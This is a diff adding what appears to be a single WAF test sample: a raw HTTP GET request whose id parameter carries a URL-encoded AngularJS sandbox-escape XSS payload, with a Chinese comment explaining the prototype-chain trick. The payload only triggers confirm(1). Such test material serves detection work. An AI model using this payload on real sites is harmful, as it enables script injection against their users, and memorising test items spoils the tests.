@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_框架_AngularJS-06506756
+# 通过访问 x['y'] 的方式，获取到 String 构造函数的原型对象。通过给原型对象的 charAt 方法重新赋值为数组的 join 方法，实现了原型链的修改。
+GET /?id=%7B%7Bx=%7B%27y%27:%27%27.constructor.prototype%7D%3Bx%5B%27y%27%5D.charAt=%5B%5D.join%3B$eval%28%27x=confirm%281%29%27%29%3B%7D%7D&bid=hd_tag_m8mv25dp HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25dp
+RM-PRO-Token: d090e3e1cc56481da1b53e56072e9809
+RM-PRO-Time: 1742808462188
+User-Agent: curl/7.83.1
+
